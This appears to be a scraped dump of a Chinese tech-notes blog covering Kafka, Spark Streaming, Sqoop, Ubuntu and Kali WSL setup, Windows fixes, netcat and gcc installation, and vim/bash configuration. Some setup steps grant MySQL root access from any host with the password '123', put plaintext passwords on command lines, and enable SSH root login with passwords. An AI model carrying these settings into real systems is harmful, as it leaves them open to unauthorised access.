Kafkakafka 的两个重要版本 Kafka-0.8 consumer 在消费消息的时候会记录一个偏移量（offset） offset 偏移量记录上一次消费到哪里了，那么下一次我知道要从哪里继续消费数据 偏移量被保存在 Zookeeper 中 问题：在一个公司里可能有几百号人去消费 kafka 集群，这个时候 zookeeper 会面临高并发的读写（zookeeper 不擅长高并发读写，zookeeper 是有问题的）这个设计明显是有问题的 Kafka-0.10 不再在 zookeeper 中存储 offset 了 在 kafka 中设计了一个特殊topic(__consumer_offset)，将所有的 consumer 中的所有offset存在了这个topic中 这个用来存储 offset 的 topic 默认 50 个分区，如果集群足够大的话那么这些分区也会均匀的分布在整个集群中支持高并发的读写，这样高并发的读写就不会成为瓶颈了 0.8-kafka (zookeeper) 和 0.10-kafka (kafka) 的 offset 是怎么提交的？ 自动提交offset，这样整个系统就可能面临丢失数据的风险 SparkStreaming 防数据丢失设计Kafka 每隔5秒提交一次 offset，如果这样我们的程序就有可能丢数据，为什么？ SparkStreaming 读取到了 kafka 的数据（offset = 100），还没有处理正好遇到了5 s 的时间间隔提交了 offset 这个时候 offset 已经提交了，但是等到处理的时候，发现处理失败了 这样重启的时候数据就发生了丢失，我们企业中当然是不允许数据丢失的 怎么解决丢数据的问题呢？ kafka-0.8：把自动提交 offset 关掉，改成手动提交 offset，但是这个时候有可能出现数据重复；因为你在提交 offset 的时候有可能失败，所以就会重复的消费数据进行处理，但是这个总好过丢数据，并且可以根据幂等性等一些方案对重复数据进行过滤，来保证数据不丢失的前提下保证唯一性 kafka-0.10：和 kafka-0.8 一样关闭自动提交 offset，改成手动提交，只是 offset 存储的地方不一样 实时处理系统中对数据处理的策略 At most once 一条记录要么被处理一次，要么没有被处理（丢数据） At least once 一条记录可能被处理一次或者多次，可能会重复处理（重复消费） Exactly once 一条记录只被处理一次（仅一次） 要想实现仅一次语义 数据的输入：从上一次 offset 读取数据 offset 数据的处理：Spark 本身就有容错，所以天然的就保证了Exactly-Once 数据的输出：利用事务去实现"},{"title":"","date":"2021-02-07T13:40:00.000Z","updated":"2022-05-10T02:12:00.000Z","comments":true,"path":"notes/Spark/streaming.html","permalink":"https://blog.mhuig.top/notes/Spark/streaming","excerpt":"","text":"Streaming SparkStreaming 实时任务场景介绍2014 年的大数据的三剑客 Hadoop: 必须会使用 Java Hive: 大数据中使用最广泛的一个技术 Sql =&gt; MapReduce Storm : 人性是贪婪的，Hadoop 和 Hive 都是计算的离线的、历史的数据 后来的大数据的三剑客 Spark : 使用 SparkCore 内存计算提高了 MapReduce 的计算效率 Scala、Python、Java SparkSQL: Sql =&gt; Spark Core任务 SparkStreaming/Flink 实时的应用场景：2020 淘宝双 11 成交额 4892 亿 实时计算就是来一个订单计算一个订单，每时每刻每秒都在统计 离线计算就是统计某个已经发生的时间段内的数据 例：淘宝在年底的时候计算 1.1-12.31 号的所有订单 坐电梯的时候需要凑够一波人坐电梯上去，把每一个人看作一个数据集攒了一定的人数之后一起坐电梯上去，我们会等待一定的时间统一处理数据，这个时候我们处理的就是历史数据了 特点 处理的是离线的数据 每次处理的数据量比较大 处理的时间比较长，比较慢 扶梯 1、处理的是实时的数据 2、每次处理的数据量不大 3、处理的时间比较短、比较快 数据流 实时任务处理的就是数据流，数据流其实只是一个形象的说法，指的是任务处理的数据像流水一样源源不断的过来，就像水龙头里面的水一样 SparkStreaming 程序入口剖析SparkCore核心抽象：RDD--Resiliennt Distributed Datasets 程序入口：val sc = new SparkContext(conf) 算子的操作：Transformation/Action SparkSQL核心抽象：DataFrame/DataSet 程序入口： Spark 1.x：new SQLContext(conf)、new HiveContext(conf) Spark 2.x/3.x：val ss = new SparkSession(conf) 算子的操作 / SQL SparkStreaming核心抽象：DStream 程序入口： val conf = new SparkConf().setAppName(\"SS\").setMaster(\"local[2]\")val sc = new SparkContext(conf)val ssc = new StreamingContext(sc,Seconds(1)) 算子操作（RDD 的算子操作在 SparkStreaming 上都可以用） DStream 核心抽象深度剖析1、SparkStreaming 的任务是基于 SparkCore，然后我们任务启动的时候，或者是初始化的时候都会有一个 Driver 的服务 2、Driver 端会发送 Receivers 到 Worker 里面，Receiver 其实说白了就是一个接收器，接收数据，这个 Receiver 具体就是表现为一个 Task 任务，默认情况下只有一个 Receiver 可以通过配置多个 3、Receiver 会接收数据，并且会把数据生成 block 块（1、生成文件块的依据是啥？）接着就把这些文件块（block）存入到 Executor 的内存里面，为了保证数据安全，默认这些数据是有副本的，在其它的 Executor 上存储副本 4、receiver 会把 block 的信息（元数据的信息）发送给 Driver 端 5、Driver 端会根据一定的时间间隔（2、封装 RDD 时间间隔是多少？）把这些 block 封装成为一个 RDD，然后进行计算 Receiver 把数据合并成 block 块的依据？ 每 200ms 生成一个 Block 1 个 block 对应 1 个 partition 对应 1 个 task 任务 Driver 将 Block 封装成 RDD 的时间间隔是？ 根据程序入口中的时间参数，如ssc = new StreamingContext(sc,Seconds(1))就是每隔 1s 中将 block 块合封装成一个 RDD SparkStreaming 不是真正意义上的实时计算，不是真的来一条数据就处理一条数据；微批处理，只不过间隔较短，每次数据里的数据量不大，然后又比较快，所以我们就把它认为实时处理了！！！准实时处理 时间间隔： Batch interval 指的就是我们的这个实时任务多久运行一次，这个是我们获取程序入口的时候自己指定的 block interval 默认是 200 ms 一个一个的 RDD 的流就被 Spark 抽象为 DStream RDD 流 = DStream 快速上手引入类库 import org.apache.spark.streaming.dstream.{DStream, ReceiverInputDStream}import org.apache.spark.streaming.{Seconds, StreamingContext}import org.apache.spark.{SparkConf, SparkContext}import org.apache.log4j.{Level, Logger} 步骤 1：初始化程序入口 步骤 2：通过数据源获取数据（数据输入） 步骤 3：进行算子的操作，实现业务（数据处理） 步骤 4：数据的输出 步骤 5：启动任务 步骤 6：等待任务结束"},{"title":"","date":"2022-05-10T06:36:00.000Z","updated":"2022-05-10T06:36:00.000Z","comments":true,"path":"notes/Sqoop/index.html","permalink":"https://blog.mhuig.top/notes/Sqoop/","excerpt":"","text":".fa-secondary{opacity:.4} Sqoop Sqoop .prev-next{ display: none !important; }"},{"title":"","date":"2019-05-11T03:35:00.000Z","updated":"2022-05-11T03:35:00.000Z","comments":true,"path":"notes/Sqoop/overview.html","permalink":"https://blog.mhuig.top/notes/Sqoop/overview","excerpt":"","text":"Overview 大数据处理技术 - sqoop 数据迁移 概述 sqoop 是 apache 旗下一款 Hadoop 和关系数据库服务器之间传送数据 的工具。 导入数据：MySQL，Oracle 导入数据到 Hadoop 的 HDFS、HIVE、HBASE 等数据存储系统； 导出数据：从 Hadoop 的文件系统中导出数据到关系数据库 mysql 等 sqoop1 与 sqoop2 架构对比sqoop1 架构 sqoop2 架构 工作机制将导入或导出命令翻译成 mapreduce 程序来实现 在翻译出的 mapreduce 中主要是对 inputformat 和 outputformat 进行定制"},{"title":"","date":"2019-05-11T03:36:00.000Z","updated":"2022-05-12T06:54:00.000Z","comments":true,"path":"notes/Sqoop/uses.html","permalink":"https://blog.mhuig.top/notes/Sqoop/uses","excerpt":"","text":"安装部署 大数据处理技术 - sqoop 实战及原理 下载并解压安装 sqoop 的前提是已经具备 java 和 hadoop 的环境 下载地址http://archive.cloudera.com/cdh5/cdh/5/sqoop1 版本详细下载地址http://archive.cloudera.com/cdh5/cdh/5/sqoop-1.4.6-cdh5.14.0.tar.gzsqoop2 版本详细下载地址http://archive.cloudera.com/cdh5/cdh/5/sqoop2-1.99.5-cdh5.14.0.tar.gz 我们这里使用 sqoop1 的版本，下载之后上传到/export/softwares 目录下，然后进行解压 cd /export/softwarestar -zxvf sqoop-1.4.6-cdh5.14.0.tar.gz -C ../servers/ 修改配置文件cd /export/servers/sqoop-1.4.6-cdh5.14.0/conf/cp sqoop-env-template.sh sqoop-env.shvim sqoop-env.sh sqoop-env.shexport HADOOP_COMMON_HOME=/export/servers/hadoop-2.6.0-cdh5.14.0export HADOOP_MAPRED_HOME=/export/servers/hadoop-2.6.0-cdh5.14.0export HIVE_HOME=/export/servers/hive-1.1.0-cdh5.14.0 加入额外的依赖包sqoop 的使用需要添加两个额外的依赖包，一个是 mysql 的驱动包，一个是 java-json 的的依赖包，不然就会报错 mysql-connector-java-5.1.40.jarjava-json.jar 验证启动cd /export/servers/sqoop-1.4.6-cdh5.14.0bin/sqoop-version Sqoop 的数据导入“导入工具” 导入单个表从 RDBMS 到 HDFS。表中的每一行被视为 HDFS 的记录。所有记录都存储为文本文件的文本数据（或者 Avro、sequence 文件等二进制数据） 列举出所有的数据库 命令行查看帮助 bin/sqoop list-databases --help 列出 win10 主机所有的数据库:开启本地数据库远程连接权限: GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY '123' WITH GRANT OPTION;flush privileges; bin/sqoop list-databases --connect jdbc:mysql://192.168.52.120:3306/ --username root --password 123456 bin/sqoop list-databases --connect jdbc:mysql://10.6.67.200:3306/ --username root --password 123 查看某一个数据库下面的所有数据表 bin/sqoop list-tables --connect jdbc:mysql://10.6.67.200:3306/test00 --username root --password 123 导入数据库表数据到 HDFS下面的命令用于从 MySQL 数据库服务器中的 emp 表导入 HDFS。 bin/sqoop import --connect jdbc:mysql://10.6.67.200:3306/test00 --password 123 --username root --table emp --m 1 为了验证在 HDFS 导入的数据，请使用以下命令查看导入的数据 hdfs dfs -ls /user/root/emp 导入到 HDFS 指定目录在导入表数据到 HDFS 使用 Sqoop 导入工具，我们可以指定目标目录。使用参数 --target-dir 来指定导出目的地，使用参数 —delete-target-dir 来判断导出目录是否存在，如果存在就删掉 bin/sqoop import --connect jdbc:mysql://10.6.67.200/test00 --username root --password 123 --delete-target-dir --table emp --target-dir /sqoop/emp --m 1 查看导出的数据 hdfs dfs -text /sqoop/emp/part-m-00000 它会用逗号（，）分隔 emp_add 表的数据和字段。 导入到 hdfs 指定目录并指定字段之间的分隔符bin/sqoop import --connect jdbc:mysql://10.6.67.200:3306/test00 --username root --password 123 --delete-target-dir --table emp --target-dir /sqoop/emp3 --m 1 --fields-terminated-by '\\t' 查看文件内容 hdfs dfs -text /sqoop/emp3/part-m-00000 Sqoop 的数据导出将数据从 HDFS 把文件导出到 RDBMS 数据库导出前，目标表必须存在于目标数据库中。 默认操作是从将文件中的数据使用 INSERT 语句插入到表中 更新模式下，是生成 UPDATE 语句更新表数据 hdfs 导出到 mysql数据是在 HDFS 当中的如下目录/sqoop/emp，数据内容如下 第一步：创建 mysql 表 CREATE TABLE emp_out( EMPNO int PRIMARY KEY, #员工编号 ENAME VARCHAR(10), #员工姓名 JOB VARCHAR(9), #员工工作 MGR int, #员工直属领导编号 HIREDATE DATE, #入职时间 SAL double, #工资 COMM double, #奖金 DEPTNO int #对应 dept 表的外键); 第二步：执行导出命令 通过 export 来实现数据的导出，将 hdfs 的数据导出到 mysql 当中去 bin/sqoop export \\--connect jdbc:mysql://10.6.67.200:3306/test00 \\--username root --password 123 \\--table emp_out \\--export-dir /sqoop/emp \\--input-fields-terminated-by \",\" 第三步：验证 mysql 表数据"},{"title":"","date":"2020-05-06T08:30:00.000Z","updated":"2022-05-12T08:36:00.000Z","comments":true,"path":"notes/Ubuntu/20.04.html","permalink":"https://blog.mhuig.top/notes/Ubuntu/20.04","excerpt":"","text":"Ubuntu 20.04 LTS Ubuntu 20.04 LTS 在虚拟机中的安装配置 Ubuntu 20.04 LTS 的支持周期长达 5 年，同时适用于 Ubuntu Desktop、Ubuntu Server、Ubuntu Cloud 和 Ubuntu Core，其安全和维护更新直到 2025 年 4 月才到期。其余 flavour 的支持也长达 3 年，更多详细信息请参考 Ubuntu 20.04 LTS 发行说明。 下载 Ubuntu 镜像文件官方下载地址（不推荐） https://www.ubuntu.com/download 中国官网（推荐） https://cn.ubuntu.com/ VMware 安装配置 创建新的虚拟机 桌面版系统安装配置 安装过程完成后，单击「现在重启」以完成整个过程，然后卸下安装介质并按「回车」键以重新引导系统。 服务器版系统安装配置 选择系统语言 - English键盘设置 - English网卡设置，默认。代理服务设置，无代理不填写镜像地址设置，建议换成国内镜像：http://mirrors.aliyun.com/ubuntu/空格选中 SSH 安装。环境，无需选择。开始安装，等待出现重启选项。安装完成，选择重启。 启用 root 用户 启用 root 用户 设置 root 用户使用 sudo passwd root 来设置 root 密码设置 root 密码sudo passwd root然后使用 su root 命令，再输入密码，测试是否可以进入 root 用户进入 rootsu root修改 /root/.profile 文件运行 vim /root/.profile 命令修改文件，但是发现系统没有安装 vim，可以使用 apt install vim 命令自动安装vim 安装成功后，使用 vim /root/.profile 打开该文件（你也可以使用 nano）找到最后一行：mesg n || true，先注释掉，增加 tty -s &amp;&amp; mesg n || true 这行修改 /etc/pam.d/ 目录下文件运行 cd /etc/pam.d/，里面有两个要修改的文件，即 gdm-autologin 和 gdm-password运行 vim gdm-autologin，注释掉下面一行运行 vim gdm-password，注释掉下面一行重启系统或者虚拟机输入用户名 root，然后输入设置的 root 密码，使完成用 root 登录 更换国内源 更换国内源 备份 /etc/apt/sources.listsudo cp /etc/apt/sources.list /etc/apt/sources.list.bak修改 Ubuntu 的源列表修改 /etc/apt/sources.list 文件下的列表清华大学开源软件镜像站更新 aptsudo apt-get update 安装 SSH、配置 SSH 无密码登陆 配置 SSH 集群、单节点模式都需要用到 SSH 登陆（类似于远程登陆，你可以登录某台 Linux 主机，并且在上面运行命令），Ubuntu 默认已安装了 SSH client，此外还需要安装 SSH server：sudo apt-get install openssh-server安装后，可以使用如下命令登陆本机：ssh localhost利用 ssh-keygen 生成密钥，并将密钥加入到授权中：cd ~/.ssh/ssh-keygen -t rsa # 会有提示，都按回车就可以cat ./id_rsa.pub &gt;&gt; ./authorized_keys # 加入授权如果没有问题可能是 ssh-server 的配置文件设置了拒绝以 root 用户登录的模式：nano /etc/ssh/sshd_configPermitRootLogin yes重启 ssh-serversudo /etc/init.d/ssh restart"},{"title":"","date":"2022-05-10T06:48:00.000Z","updated":"2022-05-10T06:48:00.000Z","comments":true,"path":"notes/Ubuntu/index.html","permalink":"https://blog.mhuig.top/notes/Ubuntu/","excerpt":"","text":"Ubuntu Ubuntu .prev-next{ display: none !important; }"},{"title":"","date":"2025-10-30T00:23:00.000Z","updated":"2025-10-30T01:06:00.000Z","comments":true,"path":"notes/Windows/exe.html","permalink":"https://blog.mhuig.top/notes/Windows/exe","excerpt":"","text":"修复 exe 文件默认打开方式的错误关联 修复 exe 文件默认打开方式的错误关联 问题描述曾经相隔六年先后有两个人抱着电脑找过我去解决这个问题，因此有必要在这里记录一下。 起因是对 exe 文件右键菜单，更改打开方式，一个人把打开方式改成了 QQ，另一个人是把打开方式改成了暴风影音。错误地改完后再次右键发现没有更改打开方式的选项了。 于是乎无论打开任何 EXE 应用程序都会打开 QQ，就像中病毒了一样。甚至 win+R 打开 CMD 也会打开 QQ。很有喜剧效果。哈哈哈。 如何打开 CMD 和 注册表找到路径 C:\\Windows\\System32 把 cmd.exe 复制并改名为 cmd.com 然后打开 cmd.com 输入 regedit 即可打开注册表。 解决方案当 EXE 文件默认打开方式被错误关联到其他打开方式时，最快的修复方法是通过修改注册表恢复系统默认设置。以下是两种经过验证的解决方案，适用于 Windows 系统： 方法一：注册表修复法（推荐） 创建注册表修复文件 新建文本文档，复制以下代码（确保格式完整，无多余空格）： Windows Registry Editor Version 5.00 [HKEY_CLASSES_ROOT\\.exe]@=\"exefile\" [HKEY_CLASSES_ROOT\\exefile\\shell\\open\\command]@=\"\\\"%1\\\" %*\"\"IsolatedCommand\"=\"\\\"%1\\\" %*\" [-HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.exe][-HKEY_CURRENT_USER\\SOFTWARE\\Classes\\.exe] 保存为 修复EXE关联.reg （需在文件资源管理器中勾选 \"显示文件扩展名\"）。 重点在于最后两行，重点排查注册表中的 [HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FileExts\\.exe] 和 [HKEY_CURRENT_USER\\SOFTWARE\\Classes\\.exe] ，发现错误删除即可，因为这是错误添加的。 导入注册表 双击该文件，在弹出的确认窗口中选择 \"是\"，将配置写入系统注册表。此操作会重置 EXE 文件的默认关联，移除错误绑定。 方法二：命令行修复（适用于注册表无法打开时） 进入安全模式 例如对于 win7 重启电脑并反复按 F8 ，选择 \"安全模式\" 启动（部分系统需通过 \"高级启动选项\" 进入） 执行修复命令 打开命令提示符（管理员模式），输入以下命令并回车： assoc .exe=exefileftype exefile=\"%1\" %* 第一条命令恢复 EXE 文件类型关联，第二条设置正确的执行参数。 此处省略一万字。。。 注意事项图标缓存问题：修复后若图标显示异常，可通过批处理命令重置缓存： taskkill /f /im explorer.exedel %userprofile%\\AppData\\Local\\IconCache.db /astart explorer 将上述代码保存为 .bat 文件并双击执行。 修复完成后，所有 EXE 程序将恢复默认打开方式。"},{"title":"","date":"2022-05-10T06:55:00.000Z","updated":"2022-05-10T06:55:00.000Z","comments":true,"path":"notes/Windows/index.html","permalink":"https://blog.mhuig.top/notes/Windows/","excerpt":"","text":"Windows Windows .prev-next{ display: none !important; }"},{"title":"","date":"2020-02-05T04:57:00.000Z","updated":"2022-05-12T09:04:00.000Z","comments":true,"path":"notes/Windows/gcc.html","permalink":"https://blog.mhuig.top/notes/Windows/gcc","excerpt":"","text":"安装 gcc windows 安装 gcc 下载先去官网下载安装包，http://www.mingw.org， 进入官网找到 download： 单击就可以直接下载了。 安装双击运行下载的 exe，然后点 install，然后就是下一步到底就行了，最后选择安装 gcc-g++ 的就可以了。 注意下面这个要选中 其他需要的也可以自行选择，安装完之后，也可以通过安装目录下 bin 目录的 安装其他东西，可以自行去了解。 配置安装完成后就是配置环境变量了 然后打开控制台，输入: gcc -v gcc --version 我们可以写一个例子试一下，经典例子 hello world 出来吧！ #include &lt;stdio.h&gt;int main(){ printf(\"Hello world!\"); return 0;} gcc -o test main.cpp MinGW-w64Window 系统下的 MinGW，总是编译为 32 位代码。因为 MinGW 只支持 32 位代码。 Window 系统下的 MinGW-w64（例如安装了 TDM - GCC，选择 MinGW-w64），默认是编译为 64 位代码，包括在 32 位的 Windows 系统下。"},{"title":"","date":"2020-01-10T02:10:00.000Z","updated":"2022-05-12T09:05:00.000Z","comments":true,"path":"notes/Windows/netcat.html","permalink":"https://blog.mhuig.top/notes/Windows/netcat","excerpt":"","text":"netcat 的安装及使用 windows 环境下 netcat 的安装及使用 Step 1下载 netcat 下载地址：https://eternallybored.org/misc/netcat/ Step 2解压文件夹 Step 3将文件夹中的所有内容复制到 C:\\Windows\\System32 的文件夹下 或者配置环境变量 Step 4打开命令界面：Windows+R cmd 输入 nc 命令即可."},{"title":"","date":"2019-11-23T01:23:00.000Z","updated":"2022-05-12T09:06:00.000Z","comments":true,"path":"notes/Windows/kali.html","permalink":"https://blog.mhuig.top/notes/Windows/kali","excerpt":"","text":"适用于 Linux 的 windows 子系统 适用于 Linux 的 windows 子系统 开启 wsl首先：为了 win10 能运行适用于 Linux 的 windows 子系统，我们需要开启 wsl第一种方法： 开启 wsl，开启步骤：按 win + x 进入 Windows Power Shell，输入下面的命令开启， Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux 开启后重启系统。 第二种 方法步骤 安装 kali进入应用商店，搜索 kali，直接安装 安装 VIMsudo apt-get install vim 更新源vi /etc/apt/sources.list #阿里云deb http://mirrors.aliyun.com/kali kali-rolling main non-free contribdeb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib#清华大学deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-freedeb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free#浙大deb http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-freedeb-src http://mirrors.zju.edu.cn/kali kali-rolling main contrib non-free#中科大deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contribdeb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib#官方源deb http://http.kali.org/kali kali-rolling main non-free contribdeb-src http://http.kali.org/kali kali-rolling main non-free contrib sudo apt-get update &amp;&amp; sudo apt-get dist-upgrade apt-get install apt-transport-https 配置 SSH在 Linux 子系统默认命令端输入，查看 ip 地址 ifconfig 配置 SSH 服务 sudo apt-get remove --purge openssh-server ## 先删sshsudo apt-get install openssh-server ## 在安装ssh sudo rm /etc/ssh/ssh_config ## 删配置文件sudo service ssh --full-restart 修改 sshd_config 文件 vi /etc/ssh/sshd_config 将 #PasswordAuthentication no 的注释去掉，并且将 NO 修改为 YES，kali 中默认是 yes PasswordAuthentication yes 将 PermitRootLogin without-password 修改为 PermitRootLogin yes 使用 xshell 登录 上面命令执行完之后，在 xshell 中输入用户名和 ip 就可以通过 xshell 登录自己电脑的 Linux。 配置永久解决方案 通过上面的方法，我们可以通过 xshell 登录自己电脑的 Linux。但是断开之后重新开机，我们又需要重新配置 SSH。因此，我们需要配置以下命令下，一劳永逸。 sudo service ssh --full-restart ## 将该命令保存为service.sh，存在home目录下 配置好之后，下次开机，只需要在 Linux 子系统的默认终端运行 sh service.sh 命令后，关掉终端改用 xshell 登录即可。 图形界面sudo apt-get install vnc4server tightvncserversudo apt-get install xrdpsudo sed -i 's/port=3389/port=3390/g' /etc/xrdp/xrdp.ini//apt-get install kali-defaults kali-root-login desktop-base kde-fullsudo apt-get install xorgsudo apt-get install xfce4//apt-get install kali-defaults kali-root-login desktop-base xfce4 xfce4-places-plugin xfce4-goodiessudo echo xfce4-session &gt;~/.xsessionsudo service xrdp restart 安装工具包apt install kali-linux-full win 下关闭 kalinet stop LxssManager ubuntu 下神奇的多线程 apt-get安装 axelsudo apt-get install axel 下载脚本 apt-fast.sh下载地址 http://www.mattparnell.com/linux/apt-fast/apt-fast.sh # !/bin/sh# apt-fast v0.03 by Matt Parnell http://www.mattparnell.com, this thing is fully open-source# if you do anything cool with it, let me know so I can publish or host it for you# contact me at admin@mattparnell.com# Special thanks# Travis/travisn000 - support for complex apt-get commands# Allan Hoffmeister - aria2c support# Abhishek Sharma - aria2c with proxy support# Richard Klien - Autocompletion, Download Size Checking (made for on ubuntu, untested on other distros)# Patrick Kramer Ruiz - suggestions - see Suggestions.txt# Sergio Silva - test to see if axel is installed, root detection/sudo autorun# Use this just like apt-get for faster package downloading.# Check for proper priveliges[ \"`whoami`\" = root ] || exec sudo \"$0\" \"$@\"# Test if the axel is installedif [ ! -x /usr/bin/axel ]then echo \"axel is not installed, perform this?(y/n)\" read ops case $ops in y) if apt-get install axel -y --force-yes then echo \"axel installed\" else echo \"unable to install the axel. you are using sudo?\" ; exit fi ;; n) echo \"not possible usage apt-fast\" ; exit ;; esacfi# If the user entered arguments contain upgrade, install, or dist-upgradeif echo \"$@\" | grep -q \"upgrade\\|install\\|dist-upgrade\"; then echo \"Working...\"; # Go into the directory apt-get normally puts downloaded packages cd /var/cache/apt/archives/; # Have apt-get print the information, including the URI's to the packages # Strip out the URI's, and download the packages with Axel for speediness # I found this regex elsewhere, showing how to manually strip package URI's you may need...thanks to whoever wrote it apt-get -y --print-uris $@ | egrep -o -e \"(ht|f)tp://[^\\']+\" &gt; apt-fast.list &amp;&amp; cat apt-fast.list | xargs -l1 axel -a # Perform the user's requested action via apt-get apt-get $@; echo -e \"\\nDone! Verify that all packages were installed successfully. If errors are found, run apt-get clean as root and try again using apt-get directly.\\n\";else apt-get $@;fi 安装 apt-fastsudo mv /root/apt-fast.sh /usr/bin/apt-fastsudo chmod +x /usr/bin/apt-fast 现在你已经可以使用 apt-fast 替代 apt-get 了试一下 apt-fast updateapt-fast upgradeapt-fast install XXXXX 魔改 axel 设置脚本sudo vim /etc/axelrc 找到 num_connections = 4 默认的 4 线程直接修改这个值例如：十线程 num_connections = 10 Linux 下的 vim 配置文件vi ~/.vimrc \" Vim config file.\" Global Settings: {{{syntax on \" highlight syntaxfiletype plugin indent on \" auto detect file typeset nocompatible \" out of Vi compatible mode\"set number \" show line numberset numberwidth=3 \" minimal culumns for line numbersset textwidth=0 \" do not wrap words (insert)set nowrap \" do not wrap words (view)set showcmd \" show (partial) command in status lineset ruler \" line and column number of the cursor positionset wildmenu \" enhanced command completionset wildmode=list:longest,full \" command completion modeset laststatus=2 \" always show the status lineset mouse= \" use mouse in all modeset foldenable \" fold linesset foldmethod=marker \" fold as markerset noerrorbells \" do not use error bellset novisualbell \" do not use visual bellset t_vb= \" do not use terminal bellset wildignore=.svn,.git,*.swp,*.bak,*~,*.o,*.aset autowrite \" auto save before commands like :next and :makeset cursorlineset hidden \" enable multiple modified buffersset history=1000 \" record recent used command historyset autoread \" auto read file that has been changed on diskset backspace=indent,eol,start \" backspace can delete everythingset completeopt=menuone,longest \" complete options (insert)set pumheight=10 \" complete popup heightset scrolloff=5 \" minimal number of screen lines to keep beyond the cursorset autoindent \" automatically indent new lineset cinoptions=:0,l1,g0,t0,(0,(s \" C kind language indent optionsset clipboard+=unnamed \" shared clipboardset noexpandtab \" do not use spaces instead of tabsset tabstop=4 \" number of spaces in a tabset softtabstop=4 \" insert and delete space of &lt;tab&gt;set shiftwidth=4 \" number of spaces for indentset expandtab \" expand tabs into spacesset incsearch \" incremental searchset hlsearch \" highlight search matchset ignorecase \" do case insensitive matchingset smartcase \" do not ignore if search pattern has CAPSset nobackup \" do not create backup file\"set noswapfile \" do not create swap fileset backupcopy=yes \" overwrite the original fileset encoding=utf-8set termencoding=utf-8set fileencoding=utf-8set fileencodings=gb2312,utf-8,gbk,gb18030set fileformat=unixset background=dark\"colorscheme SolarizedDark_modified\"colorscheme wombat_modified\" gui settingsif has(\"gui_running\") set guioptions-=T \" no toolbar set guioptions-=r \" no right-hand scrollbar set guioptions-=R \" no right-hand vertically scrollbar set guioptions-=l \" no left-hand scrollbar set guioptions-=L \" no left-hand vertically scrollbar autocmd GUIEnter * simalt ~x \" window width and height language messages zh_CN.utf-8 \" use chinese messages if hasendif\" Restore the last quit position when open file.autocmd BufReadPost * \\ if line(\"'\\\"\") &gt; 0 &amp;&amp; line(\"'\\\"\") &lt;= line(\"$\") | \\ exe \"normal g'\\\"\" | \\ endif\"}}}\" Key Bindings: {{{let mapleader = \",\"let maplocalleader = \"\\\\\"\" map : -&gt; &lt;space&gt;map &lt;Space&gt; :\" move between windowsnmap &lt;C-h&gt; &lt;C-w&gt;hnmap &lt;C-j&gt; &lt;C-w&gt;jnmap &lt;C-k&gt; &lt;C-w&gt;knmap &lt;C-l&gt; &lt;C-w&gt;l\" Don't use Ex mode, use Q for formattingmap Q gq\"make Y consistent with C and Dnnoremap Y y$\" toggle highlight trailing whitespacenmap &lt;silent&gt; &lt;leader&gt;l :set nolist!&lt;CR&gt;\" Ctrl-E to switch between 2 last buffersnmap &lt;C-E&gt; :b#&lt;CR&gt;\" ,e to fast finding files. just type beginning of a name and hit TABnmap &lt;leader&gt;e :e **/\" Make shift-insert work like in Xtermmap &lt;S-Insert&gt; &lt;MiddleMouse&gt;map! &lt;S-Insert&gt; &lt;MiddleMouse&gt;\" ,n to get the next location (compilation errors, grep etc)nmap &lt;leader&gt;n :cn&lt;CR&gt;nmap &lt;leader&gt;p :cp&lt;CR&gt;\" Ctrl-N to disable search match highlightnmap &lt;silent&gt; &lt;C-N&gt; :silent noh&lt;CR&gt;\" center display after searchingnnoremap n nzznnoremap N Nzznnoremap * *zznnoremap # #zznnoremap g* g*zznnoremap g# g#z\"}}}\" mrulet MRU_Window_Height = 10nmap &lt;Leader&gt;r :MRU&lt;cr&gt;\" taglistlet g:Tlist_WinWidth = 25let g:Tlist_Use_Right_Window = 0let g:Tlist_Auto_Update = 1let g:Tlist_Process_File_Always = 1let g:Tlist_Exit_OnlyWindow = 1let g:Tlist_Show_One_File = 1let g:Tlist_Enable_Fold_Column = 0let g:Tlist_Auto_Highlight_Tag = 1let g:Tlist_GainFocus_On_ToggleOpen = 1nmap &lt;Leader&gt;t :TlistToggle&lt;cr&gt;\" nerdtreelet g:NERDTreeWinPos = \"right\"let g:NERDTreeWinSize = 30let g:NERDTreeShowLineNumbers = 1let g:NERDTreeQuitOnOpen = 1nmap &lt;Leader&gt;f :NERDTreeToggle&lt;CR&gt;nmap &lt;Leader&gt;F :NERDTreeFind&lt;CR&gt;\"pastevmap &lt;C-c&gt; \"+ynmap &lt;C-v&gt; \"+pset pastetoggle=&lt;F12&gt;\"C，C++ Java Compile and run by F5map &lt;F5&gt; :call CompileRunGcc()&lt;CR&gt;func! CompileRunGcc() exec \"w\" if &amp;filetype == 'c' exec \"!g++ % -o %&lt;\" exec \"! ./%&lt;\" elseif &amp;filetype == 'cpp' exec \"!g++ % -o %&lt;\" exec \"! ./%&lt;\" elseif &amp;filetype == 'java' exec \"!javac %\" exec \"!java %&lt;\" elseif &amp;filetype == 'sh' :!./% endifendfunc\"C,C++ debugmap &lt;F8&gt; :call Rungdb()&lt;CR&gt;func! Rungdb() exec \"w\" exec \"!g++ % -g -o %&lt;\" exec \"!gdb ./%&lt;\"endfunc PS1PS1='${debian_chroot:+($debian_chroot)}\\[\\033[01;31m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ ' bashrc# ~/.bashrc: executed by bash(1) for non-login shells.# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)# for examples# If not running interactively, don't do anythingcase $- in *i*) ;; *) return;;esac# don't put duplicate lines or lines starting with space in the history.# See bash(1) for more optionsHISTCONTROL=ignoreboth# append to the history file, don't overwrite itshopt -s histappend# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)HISTSIZE=1000HISTFILESIZE=2000# check the window size after each command and, if necessary,# update the values of LINES and COLUMNS.shopt -s checkwinsize# If set, the pattern \"**\" used in a pathname expansion context will# match all files and zero or more directories and subdirectories.#shopt -s globstar# make less more friendly for non-text input files, see lesspipe(1)#[ -x /usr/bin/lesspipe 